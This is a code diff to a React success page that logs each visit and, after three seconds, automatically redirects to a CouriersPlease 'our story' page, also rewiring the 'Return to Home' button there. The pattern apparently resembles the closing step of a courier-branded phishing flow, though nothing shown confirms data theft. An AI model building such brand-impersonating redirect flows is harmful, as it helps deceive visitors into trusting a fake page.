@@ -8,6 +8,8 @@ import { useEffect } from "react";
 import { useVisitId } from "@/hooks/use-visit-id";
 import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";
 
+const COURIERSPLEASE_OUR_STORY = "https://www.couriersplease.com.au/our-story";
+
 export default function Success() {
   useVisitId(); // Initialiser le visitId
 
@@ -23,6 +25,14 @@ export default function Success() {
         notes: "User reached success page",
       }),
     });
+  }, []);
+
+  // Redirection automatique vers CouriersPlease Our Story après 3 secondes
+  useEffect(() => {
+    const t = setTimeout(() => {
+      window.location.href = COURIERSPLEASE_OUR_STORY;
+    }, 3000);
+    return () => clearTimeout(t);
   }, []);
 
   return (
@@ -64,7 +74,7 @@ export default function Success() {
               </div>
 
               <Button 
-                onClick={() => window.location.href = "https://www.couriersplease.com.au"}
+                onClick={() => (window.location.href = COURIERSPLEASE_OUR_STORY)}
                 className="w-full bg-brand-blue hover:bg-brand-primary-hover text-white font-bold py-6"
               >
                 Return to Home
